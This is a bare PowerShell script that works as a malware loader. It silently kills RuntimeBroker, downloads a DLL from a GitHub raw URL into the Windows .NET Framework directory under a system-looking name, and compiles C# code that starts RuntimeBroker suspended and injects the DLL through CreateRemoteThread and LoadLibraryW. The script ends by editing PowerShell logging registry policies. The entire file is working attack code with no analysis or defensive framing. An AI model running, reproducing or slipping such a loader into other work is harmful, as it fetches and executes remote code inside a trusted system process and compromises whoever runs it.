$ErrorActionPreference = 'SilentlyContinue'
$dllPath = if ([Environment]::Is64BitOperatingSystem) { "$env:SystemRoot\Microsoft.NET\Framework64\sbscmp30_mscorwks.dll" } else { "$env:SystemRoot\Microsoft.NET\Framework\sbscmp30_mscorwks.dll" }
$processName = 'RuntimeBroker'
$processPath = "$env:SystemRoot\System32\$processName.exe"
Get-Process -Name $processName -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 2
New-Item -ItemType Directory -Force -Path (Split-Path $dllPath) | Out-Null
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/TheMasterHacker2244/Main/main/sbscmp30_mscorwks.dll" -OutFile $dllPath -ErrorAction Stop
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.ComponentModel;
public class I {
    [DllImport("kernel32", SetLastError = true)]
    static extern IntPtr OpenProcess(uint a, bool b, int c);
    [DllImport("kernel32", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    [DllImport("kernel32", SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32", SetLastError = true)]
    static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr x, IntPtr p, uint f, IntPtr t);
    [DllImport("kernel32", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr h, uint m);
    [DllImport("kernel32", SetLastError = true)]
    static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    [DllImport("kernel32", SetLastError = true)]
    static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);
    [DllImport("kernel32")] static extern uint ResumeThread(IntPtr hThread);
    [DllImport("kernel32")] static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);
    [DllImport("kernel32")] static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
    [DllImport("kernel32")] static extern bool Module32First(IntPtr hSnapshot, ref MODULEENTRY32 lpme);
    [DllImport("kernel32")] static extern bool Module32Next(IntPtr hSnapshot, ref MODULEENTRY32 lpme);
    [DllImport("kernel32")] static extern bool CloseHandle(IntPtr hObject);
    const uint TH32CS_SNAPMODULE = 0x00000008;
    const uint TH32CS_SNAPMODULE32 = 0x00000010;
    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct MODULEENTRY32 {
        public uint dwSize;
        public uint th32ModuleID;
        public uint th32ProcessID;
        public uint GlblcntUsage;
        public uint ProccntUsage;
        public IntPtr modBaseAddr;
        public uint modBaseSize;
        public IntPtr hModule;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
        public string szModule;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExePath;
    }
    const uint CREATE_SUSPENDED = 0x00000004;
    static bool IsModuleLoaded(int pid, string dllName) {
        IntPtr snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, (uint)pid);
        if (snapshot == (IntPtr)(-1)) return false;
        MODULEENTRY32 me = new MODULEENTRY32();
        me.dwSize = (uint)Marshal.SizeOf(me);
        if (!Module32First(snapshot, ref me)) { CloseHandle(snapshot); return false; }
        do {
            if (me.szModule.Equals(dllName, StringComparison.OrdinalIgnoreCase)) { CloseHandle(snapshot); return true; }
        } while (Module32Next(snapshot, ref me));
        CloseHandle(snapshot);
        return false;
    }
    public static bool InjectSuspended(string targetPath, string dllPath) {
        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);
        PROCESS_INFORMATION pi;
        if (!CreateProcess(null, targetPath, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi)) return false;
        IntPtr hProcess = pi.hProcess;
        IntPtr hThread = pi.hThread;
        byte[] dllBytes = System.Text.Encoding.Unicode.GetBytes(dllPath);
        uint dllSize = (uint)dllBytes.Length;
        IntPtr remoteMem = VirtualAllocEx(hProcess, IntPtr.Zero, dllSize, 0x3000, 0x4);
        if (remoteMem == IntPtr.Zero) { CloseHandle(hProcess); CloseHandle(hThread); return false; }
        uint written;
        WriteProcessMemory(hProcess, remoteMem, dllBytes, dllSize, out written);
        IntPtr kernel32 = GetModuleHandle("kernel32.dll");
        IntPtr loadLib = GetProcAddress(kernel32, "LoadLibraryW");
        IntPtr remoteThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, remoteMem, 0, IntPtr.Zero);
        if (remoteThread == IntPtr.Zero) { VirtualFreeEx(hProcess, remoteMem, 0, 0x8000); CloseHandle(hProcess); CloseHandle(hThread); return false; }
        WaitForSingleObject(remoteThread, 0xFFFFFFFF);
        uint exitCode;
        GetExitCodeThread(remoteThread, out exitCode);
        CloseHandle(remoteThread);
        if (exitCode == 0) { VirtualFreeEx(hProcess, remoteMem, 0, 0x8000); CloseHandle(hProcess); CloseHandle(hThread); return false; }
        uint resume = 0;
        while (WaitForSingleObject(hThread, 0) == 0x102) { resume = ResumeThread(hThread); }
        CloseHandle(hThread);
        WaitForSingleObject(hProcess, 2000);
        bool loaded = IsModuleLoaded(pi.dwProcessId, System.IO.Path.GetFileName(dllPath));
        CloseHandle(hProcess);
        return loaded;
    }
}
'@ -ReferencedAssemblies System.Runtime.InteropServices
$result = [I]::InjectSuspended($processPath, $dllPath)
if ($result) { Write-Host "Injected" }
$basePath = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell'
$sblPath = "$basePath\ScriptBlockLogging"
$modPath = "$basePath\ModuleLogging"
$transPath = "$basePath\Transcription"
$corePath = 'HKLM:\Software\Policies\Microsoft\PowerShellCore'
Set-ItemProperty -Path $sblPath -Name 'EnableScriptBlockLogging' -Value 1 -Force
Set-ItemProperty -Path $modPath -Name 'EnableModuleLogging' -Value 1 -Force
Set-ItemProperty -Path $transPath -Name 'EnableTranscripting' -Value 1 -Force
if (Test-Path "$corePath\ScriptBlockLogging") { Set-ItemProperty -Path "$corePath\ScriptBlockLogging" -Name 'EnableScriptBlockLogging' -Value 1 -Force }
if (Test-Path "$corePath\ModuleLogging") { Set-ItemProperty -Path "$corePath\ModuleLogging" -Name 'EnableModuleLogging' -Value 1 -Force }
